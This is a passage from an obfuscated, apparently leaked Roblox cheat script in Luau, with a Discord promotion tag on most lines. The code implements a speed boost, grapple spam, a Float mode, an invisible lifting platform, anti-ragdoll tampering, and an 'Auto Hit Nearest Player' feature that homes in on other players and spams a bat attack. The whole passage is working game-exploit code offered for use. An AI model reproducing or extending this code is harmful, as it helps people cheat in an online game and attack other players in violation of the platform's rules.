			if connection3 then  -- LEAKED BY SLICED | discord.gg/pubmethod
				connection3:Disconnect()
				connection3 = nil
			end

			if connection4 then
				connection4:Disconnect()
				connection4 = nil
			end

			if connection5 then
				connection5:Disconnect()
				connection5 = nil  -- LEAKED BY SLICED | discord.gg/pubmethod
			end

			if connection9 then
				connection9:Disconnect()
				connection9 = nil
			end
		end)

		sliced12:CreateSlider({
			Name = "Adjust Speed",
			ShowWhen = sliced12:CreateToggle({
				Name = "Speed Boost",  -- LEAKED BY SLICED | discord.gg/pubmethod
				Default = true,
				Note = "Moves faster without a tool and pauses while stealing.",
				Callback = function(arg)
					flag3 = arg == true
				end,
			}),
			Min = 20,
			Max = 64,
			Default = 52,
			AllowDecimals = true,  -- LEAKED BY SLICED | discord.gg/pubmethod
			Increment = 0.1,
			Callback = function(arg)
				slicedn16 = math.clamp(tonumber(arg) or 52, 20, 64)
			end,
		})

		sliced18 = sliced12:CreateToggle({
			Name = "Speed Boost While Stealing",
			Default = true,
			Note = "Smoothly varies speed while stealing.",
			Callback = function(arg)  -- LEAKED BY SLICED | discord.gg/pubmethod
				flag4 = arg == true
				slicedn20 = math.max(20, slicedn17 - slicedn8)
				slicedn21 = 1
			end,
		})

		sliced12:CreateSlider({
			Name = "Adjust Auto Speed",
			DisplayName = "Adjust Speed On Steal",
			ShowWhen = sliced18,
			Min = 20,  -- LEAKED BY SLICED | discord.gg/pubmethod
			Max = 29,
			Default = 28,
			AllowDecimals = true,
			Increment = 0.1,
			Callback = function(arg)
				slicedn17 = math.clamp(tonumber(arg) or 28, 20, 29)
				slicedn20 = math.max(20, slicedn17 - slicedn8)
				slicedn21 = 1
			end,
		})  -- LEAKED BY SLICED | discord.gg/pubmethod

		sliced17 = sliced12:CreateToggle({
			Name = "Tool Speed Boost",
			Default = false,
			Keybind = Enum.KeyCode.Q,
			Note = "Equips the selected speed tool. Switching tools turns this off.",
			Callback = function(arg)
				if arg then
					if not slicedfn25() then
						task.defer(function()
							if sliced17 then  -- LEAKED BY SLICED | discord.gg/pubmethod
								sliced17:Set(false, true)
							end
						end)
					end
				else
					slicedfn20()
				end
			end,
		})

		sliced19 = sliced12:CreateDropdown({  -- LEAKED BY SLICED | discord.gg/pubmethod
			Name = "Speed Tool",
			ShowWhen = sliced17,
			Options = sliced25,
			Default = "Grapple Hook",
			Callback = function(arg)
				local str3 = tostring(arg or "Grapple Hook")
				if str3 == sliced26 then
					return
				end
				sliced26 = str3  -- LEAKED BY SLICED | discord.gg/pubmethod
				slicedfn11()

				if flag5 then
					slicedfn21()
				end
			end,
		})

		sliced20 = sliced12:CreateSlider({
			Name = "Adjust Tool Speed",
			ShowWhen = sliced17,
			Min = 50,  -- LEAKED BY SLICED | discord.gg/pubmethod
			Max = sliced26 == str2 and 270 or 210,
			Default = 240,
			AllowDecimals = true,
			Increment = 0.1,
			Callback = function(arg)
				if sliced26 == str2 then
					slicedn18 = math.clamp(tonumber(arg) or 240, 50, 270)
					flag15 = slicedn18
				else
					slicedn19 = math.clamp(tonumber(arg) or 185, 50, 210)  -- LEAKED BY SLICED | discord.gg/pubmethod
					flag15 = slicedn19
				end
			end,
		})

		local sliced27 = sliced13:CreateToggle({
			Name = "Auto Jump",
			Default = false,
			Note = "Automatically repeats jumps.",
			Callback = function(arg)
				flag2 = arg == true  -- LEAKED BY SLICED | discord.gg/pubmethod
				slicedfn30("Bottom", os.clock())
			end,
		})

		sliced13:CreateSlider({
			Name = "Height",
			SubOf = sliced27,
			Min = 1,
			Max = 21,
			Default = 16,
			AllowDecimals = true,  -- LEAKED BY SLICED | discord.gg/pubmethod
			Increment = 0.1,
			Note = "Sets the maximum height of each jump.",
			Callback = function(arg)
				slicedn12 = math.clamp(tonumber(arg) or 19.1, 1, 21)
			end,
		})

		sliced13:CreateSlider({
			Name = "Auto Jump Speed",
			SubOf = sliced27,
			DisplayName = "Jump Speed",  -- LEAKED BY SLICED | discord.gg/pubmethod
			Min = 20,
			Max = 110,
			Default = 50,
			AllowDecimals = true,
			Increment = 0.1,
			Note = "Controls jump speed (20 to 110, default 52 = 0.52x).",
			Callback = function(arg)
				slicedn15 = math.clamp(tonumber(arg) or 52, 20, 110) / 100
			end,
		})  -- LEAKED BY SLICED | discord.gg/pubmethod

		sliced13:CreateSlider({
			Name = "Air Hold",
			SubOf = sliced27,
			Min = 0,
			Max = 1,
			Default = 0.1,
			AllowDecimals = true,
			Increment = 0.01,
			Note = "Controls how long you stay at the top of each jump.",
			Callback = function(arg)  -- LEAKED BY SLICED | discord.gg/pubmethod
				slicedn13 = math.clamp(tonumber(arg) or 0.2, 0, 1)
			end,
		})

		sliced13:CreateSlider({
			Name = "Ground Delay",
			SubOf = sliced27,
			Min = 0,
			Max = 1,
			Default = 0,
			AllowDecimals = true,  -- LEAKED BY SLICED | discord.gg/pubmethod
			Increment = 0.01,
			Note = "Controls how long to wait on the ground before jumping again.",
			Callback = function(arg)
				slicedn14 = math.clamp(tonumber(arg) or 0, 0, 1)
			end,
		})

		floatSpeedToolBridge.GetSelectedName = function()
			return sliced26
		end

		floatSpeedToolBridge.EquipSelected = function()  -- LEAKED BY SLICED | discord.gg/pubmethod
			local grappleHook = slicedfn4(sliced26)

			if not slicedfn8(grappleHook) and sliced26 == str2 then
				local sliced28
				grappleHook, sliced28 = slicedfn5("Grapple Hook")
				if not slicedfn8(grappleHook) then
					slicedfn23("Grapple Hook", sliced28)
					return nil
				end
			elseif not slicedfn8(grappleHook) then
				v.Notify("Tool unavailable", sliced26 .. " is not currently owned.", 5)  -- LEAKED BY SLICED | discord.gg/pubmethod
				return nil
			end

			local sliced28 = slicedfn24(grappleHook)
			if not sliced28 then
				v.Notify("Tool unavailable", "Unable to equip " .. sliced26 .. " right now.", 5)
				return nil
			end
			return sliced28
		end

		floatSpeedToolBridge.StartGrappleSpam = function(arg)  -- LEAKED BY SLICED | discord.gg/pubmethod
			if not slicedfn8(arg) or arg.Name ~= str2 then
				return false
			end
			flag11 = true
			slicedfn14()
			slicedfn13(arg)
			slicedfn18(arg)
			slicedfn16(arg)
			return true
		end  -- LEAKED BY SLICED | discord.gg/pubmethod

		floatSpeedToolBridge.PulseGrapple = function(arg)
			if not flag11 or not slicedfn8(arg) or arg.Name ~= str2 then
				return false
			end
			slicedfn13(arg)
			slicedfn18(arg)
			slicedfn16(arg)
			return true
		end

		floatSpeedToolBridge.StopGrappleSpam = function()  -- LEAKED BY SLICED | discord.gg/pubmethod
			flag11 = false

			if not flag10 then
				slicedn24 = 0
				slicedfn17()
				slicedfn12()
			end
		end
	end

	do
		local slicedn25 = 0.0083333333333333332  -- LEAKED BY SLICED | discord.gg/pubmethod
		local slicedn26 = 4
		local slicedn27 = 0.12
		local slicedn28 = 25
		local slicedn29 = 0.045
		local slicedn30 = 0.03
		local slicedn31 = 10
		local slicedn32 = 60
		local flag12 = false
		local connection6 = nil
		local slicedn33 = 0  -- LEAKED BY SLICED | discord.gg/pubmethod
		local flag13 = false
		local slicedn34 = 0
		local slicedn35 = 0
		local slicedn36 = 0
		local sliced21 = nil
		local flag14 = false
		local flag15 = false
		local sliced22 = nil
		local flag16 = false

		local function slicedfn9()  -- LEAKED BY SLICED | discord.gg/pubmethod
			if connection6 then
				connection6:Disconnect()
				connection6 = nil
			end

			flag12 = false
			slicedn33 = 0
			flag13 = false
			slicedn34 = 0
			slicedn35 = 0
			slicedn36 = 0  -- LEAKED BY SLICED | discord.gg/pubmethod
			sliced21 = nil
			local stopGrappleSpam = floatSpeedToolBridge.StopGrappleSpam

			if type(stopGrappleSpam) == "function" then
				stopGrappleSpam()
			end
		end

		local function slicedfn10()
			if flag16 then
				return
			end  -- LEAKED BY SLICED | discord.gg/pubmethod
			flag16 = true

			task.defer(function()
				flag16 = false
				slicedfn9()

				if sliced22 and sliced22:Get() == true then
					sliced22:Set(false, true)
				end
			end)
		end

		local function slicedfn11(arg)  -- LEAKED BY SLICED | discord.gg/pubmethod
			if not flag12 or not arg or not arg.Parent then
				return
			end
			local now3 = os.clock()
			slicedn35 = slicedn32
			slicedn34 = now3 + slicedn27
			flag13 = true
			slicedn36 = now3
		end

		local function slicedfn12(arg, arg2)  -- LEAKED BY SLICED | discord.gg/pubmethod
			local assemblyLinearVelocity = arg.AssemblyLinearVelocity
			local flag17 = arg2.FloorMaterial ~= Enum.Material.Air
			local now3 = os.clock()

			if now3 - slicedn36 >= slicedn29 or flag13 and slicedn34 - now3 <= slicedn30 then
				slicedfn11(arg)
			end

			if flag13 then
				if slicedn34 <= now3 then
					flag13 = false
				else  -- LEAKED BY SLICED | discord.gg/pubmethod
					local slicedn37 = (Workspace.Gravity - Workspace.Gravity) * slicedn25
					arg.AssemblyLinearVelocity = Vector3.new(assemblyLinearVelocity.X, assemblyLinearVelocity.Y + (slicedn35 - assemblyLinearVelocity.Y) * (1 - math.exp(-slicedn28 * slicedn25)) - slicedn37, assemblyLinearVelocity.Z)
				end
			elseif not flag17 then
				local gravity = Workspace.Gravity

				if assemblyLinearVelocity.Y < 0 then
					gravity += slicedn31
				end

				local slicedn37 = gravity - Workspace.Gravity

				if math.abs(slicedn37) > 0.001 then  -- LEAKED BY SLICED | discord.gg/pubmethod
					arg.AssemblyLinearVelocity = Vector3.new(assemblyLinearVelocity.X, assemblyLinearVelocity.Y - slicedn37 * slicedn25, assemblyLinearVelocity.Z)
				end
			end
		end

		local function slicedfn13(arg)
			slicedfn9()
			sliced21 = arg
			local startGrappleSpam = floatSpeedToolBridge.StartGrappleSpam

			if sliced21 and type(startGrappleSpam) == "function" then
				if not startGrappleSpam(sliced21) then  -- LEAKED BY SLICED | discord.gg/pubmethod
					sliced21 = nil
				end
			end

			flag12 = true
			local character_ = localPlayer.Character
			character_ = character_ and character_:FindFirstChild("HumanoidRootPart")

			if character_ then
				slicedfn11(character_)
			end

			connection6 = RunService.Heartbeat:Connect(function(deltaTime)  -- LEAKED BY SLICED | discord.gg/pubmethod
				if not flag12 then
					return
				end

				if flag15 and localPlayer:GetAttribute("Stealing") == true then
					slicedfn10()
					return
				end
				local character_2 = localPlayer.Character
				local humanoidRootPart = character_2 and character_2:FindFirstChild("HumanoidRootPart")
				if not humanoidRootPart then  -- LEAKED BY SLICED | discord.gg/pubmethod
					return
				end
				local humanoid = character_2:FindFirstChildOfClass("Humanoid")
				if humanoid and humanoid.Health <= 0 then
					slicedfn10()
					return
				end
				local pulseGrapple = floatSpeedToolBridge.PulseGrapple

				if sliced21 and type(pulseGrapple) == "function" then
					if not pulseGrapple(sliced21) then  -- LEAKED BY SLICED | discord.gg/pubmethod
						sliced21 = nil
					end
				end

				slicedn33 += deltaTime
				if slicedn33 < slicedn25 then
					return
				end
				local slicedn37 = math.floor(slicedn33 / slicedn25)

				if slicedn26 < slicedn37 then
					slicedn33 = 0  -- LEAKED BY SLICED | discord.gg/pubmethod
					slicedn37 = 4
				else
					slicedn33 -= slicedn37 * slicedn25
				end

				for i_ = 1, slicedn37 do
					slicedfn12(humanoidRootPart, humanoid)
				end
			end)
		end

		sliced22 = sliced5:CreateToggle({  -- LEAKED BY SLICED | discord.gg/pubmethod
			Name = "Float",
			Default = false,
			Callback = function(arg)
				if arg then
					if flag15 and localPlayer:GetAttribute("Stealing") == true then
						slicedfn10()
						return
					end
					local sliced23 = nil

					if flag14 then  -- LEAKED BY SLICED | discord.gg/pubmethod
						local equipSelected = floatSpeedToolBridge.EquipSelected

						if type(equipSelected) ~= "function" then
							v.Notify("Tool unavailable", "The Speed Tool selection is not available right now.", 5)
							slicedfn10()
							return
						end

						sliced23 = equipSelected()
						if not sliced23 then
							slicedfn10()
							return  -- LEAKED BY SLICED | discord.gg/pubmethod
						end
					end

					slicedfn13(sliced23)
				else
					slicedfn9()
				end
			end,
		})

		sliced5:CreateToggle({
			Name = "Auto Equip Speed Tool",  -- LEAKED BY SLICED | discord.gg/pubmethod
			Note = "Equips the current Speed Tool selection before Float starts.",
			Default = true,
			SubOf = sliced22,
			Callback = function(arg)
				flag14 = arg == true
			end,
		})

		sliced5:CreateToggle({
			Name = "Auto Off After Steal",
			Default = true,  -- LEAKED BY SLICED | discord.gg/pubmethod
			SubOf = sliced22,
			Callback = function(arg)
				flag15 = arg == true

				if flag15 and flag12 and localPlayer:GetAttribute("Stealing") == true then
					slicedfn10()
				end
			end,
		})

		slicedfn2(function()
			slicedfn9()  -- LEAKED BY SLICED | discord.gg/pubmethod
		end)
	end

	do
		local slicedn25 = 1
		local flag12 = false
		local connection6 = nil
		local sliced21 = nil
		local slicedn26 = 5

		local function slicedfn9()
			if sliced21 then  -- LEAKED BY SLICED | discord.gg/pubmethod
				pcall(function()
					sliced21:Destroy()
				end)

				sliced21 = nil
			end
		end

		local function slicedfn10()
			if connection6 then
				connection6:Disconnect()
				connection6 = nil  -- LEAKED BY SLICED | discord.gg/pubmethod
			end

			flag12 = false
			slicedfn9()
		end

		local function createPart()
			if sliced21 and sliced21.Parent then
				return sliced21
			end
			slicedfn9()
			local part = Instance.new("Part")  -- LEAKED BY SLICED | discord.gg/pubmethod
			part.Name = fn()
			part.Anchored = true
			part.CanCollide = true
			part.CanQuery = false
			part.CanTouch = false
			part.CastShadow = false
			part.Massless = true
			part.Size = Vector3.new(6, 1, 6)
			part.Transparency = 1
			part.Parent = Workspace  -- LEAKED BY SLICED | discord.gg/pubmethod
			sliced21 = part
			return part
		end

		local function slicedfn11()
			slicedfn10()
			flag12 = true

			connection6 = RunService.Heartbeat:Connect(function(deltaTime)
				if not flag12 then
					return
				end  -- LEAKED BY SLICED | discord.gg/pubmethod
				local character_ = localPlayer.Character
				local humanoidRootPart = character_ and character_:FindFirstChild("HumanoidRootPart")
				if not humanoidRootPart then
					slicedfn9()
					return
				end
				local sliced22 = createPart()
				local slicedn27 = math.min(deltaTime, 0.1) * slicedn26
				local humanoid = character_:FindFirstChildOfClass("Humanoid")
				local slicedn28 = 3.2  -- LEAKED BY SLICED | discord.gg/pubmethod

				if humanoid then
					slicedn28 = humanoid.HipHeight + humanoidRootPart.Size.Y * 0.5
				end

				local slicedn29 = humanoidRootPart.Position.Y - slicedn28
				local y2 = sliced22.Position.Y
				local slicedn30

				if math.abs(y2 + slicedn25 * 0.5 - slicedn29) > 6 then
					slicedn30 = slicedn29 - slicedn25 * 0.5
				else
					slicedn30 = y2 + slicedn27  -- LEAKED BY SLICED | discord.gg/pubmethod
				end

				sliced22.CFrame = CFrame.new(humanoidRootPart.Position.X, slicedn30, humanoidRootPart.Position.Z)
				local slicedn31 = slicedn30 + slicedn25 * 0.5

				if slicedn31 > slicedn29 then
					local slicedn32 = slicedn31 + slicedn28
					local slicedn33 = humanoidRootPart.CFrame - humanoidRootPart.CFrame.Position
					humanoidRootPart.CFrame = CFrame.new(humanoidRootPart.Position.X, slicedn32, humanoidRootPart.Position.Z) * slicedn33
					local assemblyLinearVelocity = humanoidRootPart.AssemblyLinearVelocity
					humanoidRootPart.AssemblyLinearVelocity = Vector3.new(assemblyLinearVelocity.X, 0, assemblyLinearVelocity.Z)
				end  -- LEAKED BY SLICED | discord.gg/pubmethod
			end)
		end

		sliced5:CreateSlider({
			Name = "Floor Push Speed",
			Min = 5,
			Max = 40,
			Default = 10,
			AllowDecimals = false,
			Increment = 1,
			Unit = " studs/s",  -- LEAKED BY SLICED | discord.gg/pubmethod
			Quick = false,
			SubOf = sliced5:CreateToggle({
				Name = "Floor Push",
				Note = "Raises an invisible platform under you and carries you up with it.",
				Default = false,
				Callback = function(arg)
					if arg then
						slicedfn11()
					else
						slicedfn10()  -- LEAKED BY SLICED | discord.gg/pubmethod
					end
				end,
			}),
			Callback = function(arg)
				slicedn26 = math.clamp(tonumber(arg) or 5, 5, 40)
			end,
		})
	end
end

local sliced9, sliced10, sliced11, slicedfn4, slicedfn5, slicedfn6, slicedfn7, slicedfn8, slicedfn9, tbl3  -- LEAKED BY SLICED | discord.gg/pubmethod
local slicedfn10, slicedfn11, slicedfn12, n, slicedfn13, slicedfn14, slicedfn15

do
	do
		local slicedn2 = 0.01
		local flag2 = false
		local slicedn3 = 50
		local connection = nil
		local connection2 = nil
		local sliced12 = nil
		local sliced13 = nil  -- LEAKED BY SLICED | discord.gg/pubmethod
		local autoRotate = true
		local sliced14 = nil
		local sliced15 = nil
		local flag3 = false
		local flag4 = false
		local slicedn4 = 0
		local obj2 = setmetatable({}, { __mode = "k" })

		local function slicedfn16(arg)
			arg = arg and arg.Character
			local humanoid = arg and arg:FindFirstChildOfClass("Humanoid")  -- LEAKED BY SLICED | discord.gg/pubmethod
			local humanoidRootPart

			if arg then
				humanoidRootPart = arg:FindFirstChild("HumanoidRootPart") or arg:FindFirstChild("UpperTorso") or arg:FindFirstChild("Torso")
			else
				humanoidRootPart = arg
			end

			if humanoid and humanoid.Health > 0 and humanoidRootPart then
				return arg, humanoid, humanoidRootPart
			end
		end  -- LEAKED BY SLICED | discord.gg/pubmethod

		local function slicedfn17(arg)
			local huge = math.huge
			local sliced16 = nil

			for _, player in ipairs(Players:GetPlayers()) do
				if player ~= localPlayer then
					local sliced17, sliced18, sliced19 = slicedfn16(player)

					if sliced19 then
						local magnitude = (sliced19.Position - arg.Position).Magnitude

						if magnitude < huge then
							huge = magnitude  -- LEAKED BY SLICED | discord.gg/pubmethod
							sliced16 = sliced19
						end
					end
				end
			end

			return sliced16
		end

		local function slicedfn18(arg)
			arg = arg and arg:FindFirstChildWhichIsA("Tool")
			if arg and arg.Name:lower():find("bat", 1, true) then  -- LEAKED BY SLICED | discord.gg/pubmethod
				return arg
			end
			local backpack = localPlayer:FindFirstChildOfClass("Backpack")

			if backpack then
				for _, child in ipairs(backpack:GetChildren()) do
					if child:IsA("Tool") and child.Name:lower():find("bat", 1, true) then
						return child
					end
				end
			end  -- LEAKED BY SLICED | discord.gg/pubmethod
		end

		local function slicedfn19(arg, arg2)
			local sliced16 = slicedfn18(arg)

			if not sliced16 then
				if not flag4 then
					flag4 = true
					v.Notify("Bat unavailable", "Bat was not found in your character or Backpack.", 5)
				end

				return nil
			end  -- LEAKED BY SLICED | discord.gg/pubmethod

			flag4 = false

			if sliced16.Parent ~= arg then
				local tool = arg:FindFirstChildWhichIsA("Tool")

				if tool and tool ~= sliced16 and not sliced14 then
					sliced14 = tool
				end

				sliced15 = sliced16
				flag3 = true

				pcall(function()
					slicedfn3(1)  -- LEAKED BY SLICED | discord.gg/pubmethod
					arg2:EquipTool(sliced16)
				end)
			end

			return sliced16.Parent == arg and sliced16 or nil
		end

		local function slicedfn20(arg)
			if not arg:IsA("BasePart") then
				return
			end

			if obj2[arg] == nil then  -- LEAKED BY SLICED | discord.gg/pubmethod
				obj2[arg] = arg.CanCollide
			end

			arg.CanCollide = false
		end

		local function slicedfn21()
			for k, sliced16 in pairs(obj2) do
				if k.Parent then
					pcall(function()
						k.CanCollide = sliced16
					end)  -- LEAKED BY SLICED | discord.gg/pubmethod
				end

				obj2[k] = nil
			end
		end

		local function slicedfn22(arg)
			if sliced12 == arg then
				return
			end

			if connection2 then
				connection2:Disconnect()  -- LEAKED BY SLICED | discord.gg/pubmethod
				connection2 = nil
			end

			slicedfn21()
			sliced12 = arg
			if not arg then
				return
			end

			for _, descendant in ipairs(arg:GetDescendants()) do
				slicedfn20(descendant)
			end  -- LEAKED BY SLICED | discord.gg/pubmethod

			connection2 = arg.DescendantAdded:Connect(function(descendant)
				if flag2 then
					slicedfn20(descendant)
				end
			end)
		end

		local function slicedfn23()
			local sliced16 = sliced13
			sliced13 = nil
			if not sliced16 or not sliced16.Parent then  -- LEAKED BY SLICED | discord.gg/pubmethod
				return
			end

			pcall(function()
				sliced16.AutoRotate = autoRotate
				local physics = Enum.HumanoidStateType.Physics

				if sliced16:GetState() == physics then
					sliced16:ChangeState(Enum.HumanoidStateType.Freefall)
				end
			end)
		end  -- LEAKED BY SLICED | discord.gg/pubmethod

		local function slicedfn24(arg)
			if sliced13 ~= arg then
				slicedfn23()
				sliced13 = arg
				autoRotate = arg.AutoRotate
			end

			arg.AutoRotate = false
			local physics = Enum.HumanoidStateType.Physics

			if arg:GetState() ~= physics then
				arg:ChangeState(Enum.HumanoidStateType.Physics)  -- LEAKED BY SLICED | discord.gg/pubmethod
			end
		end

		local function slicedfn25()
			local character_ = localPlayer.Character
			local humanoid = character_ and character_:FindFirstChildOfClass("Humanoid")
			local sliced16 = sliced15
			local sliced17 = sliced14
			sliced15 = nil
			sliced14 = nil
			if not flag3 or not character_ or not humanoid or humanoid.Health <= 0 then  -- LEAKED BY SLICED | discord.gg/pubmethod
				flag3 = false
				return
			end
			flag3 = false
			local tool = character_:FindFirstChildWhichIsA("Tool")
			if tool and tool ~= sliced16 then
				return
			end

			pcall(function()
				slicedfn3(0.5)  -- LEAKED BY SLICED | discord.gg/pubmethod

				if sliced17 and sliced17.Parent then
					humanoid:EquipTool(sliced17)
				else
					humanoid:UnequipTools()
				end
			end)
		end

		local function slicedfn26()
			flag2 = false
			slicedn4 = 0  -- LEAKED BY SLICED | discord.gg/pubmethod
			flag4 = false

			if connection then
				connection:Disconnect()
				connection = nil
			end

			if connection2 then
				connection2:Disconnect()
				connection2 = nil
			end

			sliced12 = nil  -- LEAKED BY SLICED | discord.gg/pubmethod
			slicedfn23()
			slicedfn21()
			slicedfn25()
		end

		local function slicedfn27()
			slicedfn26()
			flag2 = true

			connection = RunService.Heartbeat:Connect(function(deltaTime)
				local sliced16, sliced17, sliced18 = slicedfn16(localPlayer)

				if not sliced16 or not sliced17 or not sliced18 then  -- LEAKED BY SLICED | discord.gg/pubmethod
					slicedn4 = 0
					slicedfn23()
					return
				end

				slicedfn22(sliced16)
				local sliced19 = slicedfn19(sliced16, sliced17)
				local sliced20 = slicedfn17(sliced18)

				if not sliced20 then
					slicedn4 = 0
					slicedfn23()  -- LEAKED BY SLICED | discord.gg/pubmethod
					return
				end

				slicedfn24(sliced17)
				local lookVector = sliced20.CFrame.LookVector
				local vector = Vector3.new(lookVector.X, 0, lookVector.Z)
				local vector2

				if vector.Magnitude <= 0.001 then
					vector2 = Vector3.new(0, 0, -1)
				else
					vector2 = vector.Unit  -- LEAKED BY SLICED | discord.gg/pubmethod
				end

				local position = sliced20.Position
				local slicedn5 = position - sliced18.Position
				local magnitude = slicedn5.Magnitude

				if magnitude > 0.001 then
					position = sliced18.Position + slicedn5.Unit * math.min(magnitude, slicedn3 * deltaTime)
				end

				sliced18.CFrame = CFrame.lookAt(position, position + vector2, Vector3.new(0, 1, 0))
				sliced18.AssemblyLinearVelocity = sliced20.AssemblyLinearVelocity
				sliced18.AssemblyAngularVelocity = Vector3.zero  -- LEAKED BY SLICED | discord.gg/pubmethod
				if not sliced19 then
					slicedn4 = 0
					return
				end
				slicedn4 += deltaTime
				local slicedn6 = math.min(math.floor(slicedn4 / slicedn2), 6)
				if slicedn6 <= 0 then
					return
				end
				slicedn4 -= slicedn6 * slicedn2  -- LEAKED BY SLICED | discord.gg/pubmethod

				for i_ = 1, slicedn6 do
					pcall(function()
						sliced19:Deactivate()
						sliced19:Activate()
					end)
				end
			end)
		end

		slicedfn2(slicedfn26)

		sliced5:CreateSlider({  -- LEAKED BY SLICED | discord.gg/pubmethod
			Name = "Follow Speed",
			DisplayName = "Follow Speed",
			SubOf = sliced5:CreateToggle({
				Name = "Auto Hit Nearest Player",
				Default = false,
				Callback = function(arg)
					if arg then
						slicedfn27()
					else
						slicedfn26()  -- LEAKED BY SLICED | discord.gg/pubmethod
					end
				end,
			}),
			Min = 20,
			Max = 64,
			Default = 50,
			AllowDecimals = true,
			Increment = 0.1,
			Callback = function(arg)
				slicedn3 = math.clamp(tonumber(arg) or 50, 20, 64)  -- LEAKED BY SLICED | discord.gg/pubmethod
			end,
		})
	end

	do
		local tbl4 = { BallSocketConstraint = true, NoCollisionConstraint = true, HingeConstraint = true }

		local tbl5 = {
			[Enum.HumanoidStateType.Physics] = true,
			[Enum.HumanoidStateType.Ragdoll] = true,
			[Enum.HumanoidStateType.FallingDown] = true,
		}  -- LEAKED BY SLICED | discord.gg/pubmethod

		local slicedn2 = 12
		local slicedn3 = 5
		local slicedn4 = 0
		local sliced12 = nil

		local ok, result = pcall(function()
			return require(ReplicatedStorage.Controllers.RagdollController)
		end)

		if ok then
			sliced12 = result
		end  -- LEAKED BY SLICED | discord.gg/pubmethod

		local sliced13 = nil

		local function slicedfn16()
			if sliced13 then
				return sliced13
			end

			local ok2, result2 = pcall(function()
				return require(localPlayer:WaitForChild("PlayerScripts", 5):WaitForChild("PlayerModule", 5)):GetControls()
			end)

			if ok2 then
				sliced13 = result2  -- LEAKED BY SLICED | discord.gg/pubmethod
			end

			return sliced13
		end

		local flag2 = false
		local connection = nil
		local slicedn5 = 0
		local tbl6 = {}
		local tbl7 = {}
		local slicedn6 = 0
		local sliced14 = nil  -- LEAKED BY SLICED | discord.gg/pubmethod
		local humanoid = nil

		local function slicedfn17(arg)
			for _, sliced15 in ipairs(arg) do
				if sliced15.Connected then
					sliced15:Disconnect()
				end
			end

			table.clear(arg)
		end

		local function slicedfn18(arg)  -- LEAKED BY SLICED | discord.gg/pubmethod
			tbl6[#tbl6 + 1] = arg
		end

		local function slicedfn19(arg)
			tbl7[#tbl7 + 1] = arg
		end

		local function slicedfn20()
			if not sliced14 or not humanoid then
				return
			end
			local humanoidRootPart = sliced14:FindFirstChild("HumanoidRootPart")  -- LEAKED BY SLICED | discord.gg/pubmethod
			if not humanoidRootPart then
				return
			end
			local assemblyLinearVelocity = humanoidRootPart.AssemblyLinearVelocity
			local vector = Vector3.new(assemblyLinearVelocity.X, 0, assemblyLinearVelocity.Z)
			local slicedn7 = humanoid.WalkSpeed + slicedn3
			local y = assemblyLinearVelocity.Y
			local flag3 = false

			if slicedn7 < vector.Magnitude then
				vector = vector.Unit * slicedn7  -- LEAKED BY SLICED | discord.gg/pubmethod
				flag3 = true
			end

			if slicedn4 < y then
				y = slicedn4
				flag3 = true
			end

			if flag3 then
				pcall(function()
					humanoidRootPart.AssemblyLinearVelocity = Vector3.new(vector.X, y, vector.Z)
				end)  -- LEAKED BY SLICED | discord.gg/pubmethod
			end
		end

		local function slicedfn21()
			if not sliced14 or not sliced14.Parent then
				return
			end

			for _, descendant in ipairs(sliced14:GetDescendants()) do
				if tbl4[descendant.ClassName] then
					pcall(function()
						descendant:Destroy()  -- LEAKED BY SLICED | discord.gg/pubmethod
					end)
				end
			end
		end

		local function slicedfn22()
			if not sliced14 or not sliced14.Parent then
				return
			end

			for _, descendant in ipairs(sliced14:GetDescendants()) do
				if descendant:IsA("AnimationConstraint") and not descendant.Enabled then  -- LEAKED BY SLICED | discord.gg/pubmethod
					pcall(function()
						descendant.Enabled = true
					end)
				end
			end
		end

		local function slicedfn23()
			local sliced15 = slicedfn16()

			if sliced15 and sliced15.controlsEnabled == false then
				pcall(function()  -- LEAKED BY SLICED | discord.gg/pubmethod
					sliced15:Enable()
				end)
			end
		end

		local function slicedfn24()
			local currentCamera = Workspace.CurrentCamera

			if currentCamera and humanoid and currentCamera.CameraSubject ~= humanoid then
				pcall(function()
					currentCamera.CameraSubject = humanoid
				end)  -- LEAKED BY SLICED | discord.gg/pubmethod
			end
		end

		local function slicedfn25()
			if not humanoid or not humanoid.Parent or humanoid.Health <= 0 then
				return
			end

			if tbl5[humanoid:GetState()] then
				pcall(function()
					humanoid:ChangeState(Enum.HumanoidStateType.Running)
				end)  -- LEAKED BY SLICED | discord.gg/pubmethod
			end

			if humanoid.PlatformStand then
				humanoid.PlatformStand = false
			end
		end

		local function slicedfn26()
			if not sliced12 then
				return false
			end

			local ok2, result2 = pcall(function()  -- LEAKED BY SLICED | discord.gg/pubmethod
				return sliced12.IsInRagdoll()
			end)

			return ok2 and result2 == true
		end

		local function slicedfn27()
			if connection then
				connection:Disconnect()
				connection = nil
			end
		end  -- LEAKED BY SLICED | discord.gg/pubmethod

		local function slicedfn28()
			if not flag2 or not sliced14 or sliced14 ~= localPlayer.Character or not humanoid or not humanoid:IsDescendantOf(sliced14) then
				return
			end
			slicedn5 = os.clock() + slicedn2
			if connection then
				return
			end

			connection = RunService.Heartbeat:Connect(function()
				if not flag2 then  -- LEAKED BY SLICED | discord.gg/pubmethod
					slicedfn27()
					return
				end

				if sliced14 ~= localPlayer.Character or not humanoid or not humanoid:IsDescendantOf(sliced14) then
					slicedfn27()
					return
				end
				slicedfn20()
				slicedfn21()
				slicedfn22()  -- LEAKED BY SLICED | discord.gg/pubmethod
				slicedfn25()
				slicedfn23()
				slicedfn24()

				if os.clock() > slicedn5 or not slicedfn26() then
					slicedfn27()
				end
			end)
		end

		local function slicedfn29(arg)
			slicedn6 += 1  -- LEAKED BY SLICED | discord.gg/pubmethod
			local sliced15 = slicedn6
			slicedfn17(tbl7)
			slicedfn27()
			sliced14 = arg
			humanoid = nil
			if not flag2 or not arg then
				return
			end
			humanoid = arg:FindFirstChildOfClass("Humanoid") or arg:WaitForChild("Humanoid", 5)
			if not flag2 or slicedn6 ~= sliced15 or arg ~= localPlayer.Character or not humanoid or not humanoid:IsA("Humanoid") then  -- LEAKED BY SLICED | discord.gg/pubmethod
				return
			end

			if humanoid then
				slicedfn19(humanoid.StateChanged:Connect(function(old, new)
					if flag2 and tbl5[new] then
						slicedfn28()
					end
				end))
			end

			slicedfn19(arg.DescendantAdded:Connect(function(descendant)  -- LEAKED BY SLICED | discord.gg/pubmethod
				if flag2 and tbl4[descendant.ClassName] then
					slicedfn28()
				end
			end))

			slicedfn24()

			if slicedfn26() then
				slicedfn28()
			end
		end

		local function slicedfn30()  -- LEAKED BY SLICED | discord.gg/pubmethod
			flag2 = false
			slicedn6 += 1
			slicedfn27()
			slicedfn17(tbl7)
			slicedfn17(tbl6)
			sliced14 = nil
			humanoid = nil
		end

